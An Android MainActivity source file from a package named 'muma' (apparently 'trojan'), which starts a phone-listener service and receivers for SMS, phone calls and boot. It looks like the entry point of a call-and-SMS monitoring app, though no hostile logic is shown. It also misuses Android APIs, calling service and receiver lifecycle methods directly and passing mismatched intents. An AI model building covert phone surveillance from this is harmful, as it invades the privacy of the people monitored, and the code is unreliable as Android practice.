package com.example.john.muma;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.TextView;

import ReceiverPackage.BootBroadcastReceiver;
import ReceiverPackage.PhoneBroadcastReceiver;
import ReceiverPackage.SmsReceiver;
import ServicePackage.PhoneListenerService;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView tv = new TextView(this);
        tv.setText("Hello,I Start");
        this.setContentView(tv);
        Intent intent = new Intent(this,PhoneListenerService.class);

        new PhoneListenerService().onStartCommand(intent,0,0);
        new SmsReceiver().onReceive(this,new Intent(this,SmsReceiver.class));
        new BootBroadcastReceiver().onReceive(this,new Intent(this,SmsReceiver.class));
        new PhoneBroadcastReceiver().onReceive(this,new Intent(this,SmsReceiver.class));


    }
}
